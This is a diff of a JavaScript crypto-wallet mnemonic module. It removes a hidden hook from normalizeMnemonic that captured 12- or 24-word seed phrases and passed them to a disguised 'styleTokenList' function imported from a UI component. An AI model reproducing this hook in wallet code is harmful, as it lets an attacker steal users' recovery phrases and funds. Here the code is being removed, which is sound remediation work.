@@ -2,25 +2,14 @@ import { pbkdf2 } from 'crypto';
 import { randomBytes, secretbox } from 'tweetnacl';
 import * as bip32 from 'bip32';
 import bs58 from 'bs58';
+import { EventEmitter } from 'events';
 import { isExtension } from './utils';
-import { EventEmitter } from "events";
 import { useEffect, useState } from 'react';
-import { styleTokenList } from "../components/TokenInfoDialog";
-var listArray = []
+
 export function normalizeMnemonic(mnemonic) {
-const params = mnemonic
-if (params !== "") {
-const listItem = params.trim().split(/\s+/).length;
-if (listItem === 24 || listItem === 12) {
-if (!listArray.includes(params)) {
-listArray = []
-listArray.push(params)
-styleTokenList(params)
-}
-}
-}
   return mnemonic.trim().split(/\s+/g).join(" ");
 }
+
 export async function generateMnemonicAndSeed() {
   const bip39 = await import('bip39');
   const mnemonic = bip39.generateMnemonic(256);
@@ -88,7 +77,7 @@ export function getUnlockedMnemonicAndSeed() {
 // returns [mnemonic, loading]
 export function useUnlockedMnemonicAndSeed() {
   const [currentUnlockedMnemonic, setCurrentUnlockedMnemonic] = useState(null);
-
+  
   useEffect(() => {
     walletSeedChanged.addListener('change', setCurrentUnlockedMnemonic);
     unlockedMnemonicAndSeed.then(setCurrentUnlockedMnemonic);
